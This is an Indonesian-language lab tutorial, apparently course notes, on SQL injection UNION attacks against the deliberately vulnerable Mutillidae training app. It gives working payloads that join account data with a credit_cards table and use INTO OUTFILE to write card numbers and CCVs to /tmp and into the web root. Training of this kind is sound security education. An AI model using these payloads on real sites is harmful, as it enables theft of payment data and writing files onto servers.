# SQL Injection Union Exploit #2 (Create Output File)

## Database Practice

1. Masuk ke mysql dengan menggunakan dan gunakan database ```owasp10``` command
```
$ mysql -u root
mysql> use owasp10;  
```

2. Union accounts dengan credit_cards dengan menggunakan command
```
select * from accounts where username RLIKE '^[0-9]' union select ccid, ccnumber, ccv, expiration, null from credit_cards;
```
![1](/lesson9/3.png)

3. Coba untuk menyimpan data tabel dalam sebuah file dengan menggunakan command OUTFILE
```
select * from accounts where username RLIKE '^[0-9]' union select ccid,ccnumber,ccv,expiration,null from credit_cards INTO OUTFILE '/tmp/CCN.csv' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"' LINES TERMINATED by '\n';
```
![1](/lesson9/4.png)

4. Lihat isi file melalui mysql dengan menggunakan command
```
\! cat /tmp/CCN.csv
```
![1](/lesson9/5.png)

## Coba OUTFILE pada mutillidae

1. Masuk ke halaman sqli user info dengan cara klik menu pada sidebar kiri ```Owasp Top 10 -> A1 - Injection -> SQLi - Extract Data -> User Info```
![1](/lesson9/6.png)

2. Union tabel ```accounts``` dengan tabel ```credit_cards```
```
' union select ccid,ccnumber,ccv,expiration,null from credit_cards --
```
![1](/lesson9/7.png)

3. Dapat dilihat hasil unionnya
![1](/lesson9/8.png)

4. Setelah itu coba jalankan union OUTFILE dengan menggunakan command
```
' union select ccid,ccnumber,ccv,expiration,null from credit_cards INTO OUTFILE '/var/www/html/mutillidae/CCN2.txt' FIELDS TERMINATED BY ',' OPTIONALLY ENCLOSED BY '"' LINES TERMINATED BY '\n' --
```
jangan lupa unutk menambahkan spasi setelah syntax comment ```"-- "```
![1](/lesson9/9.png)
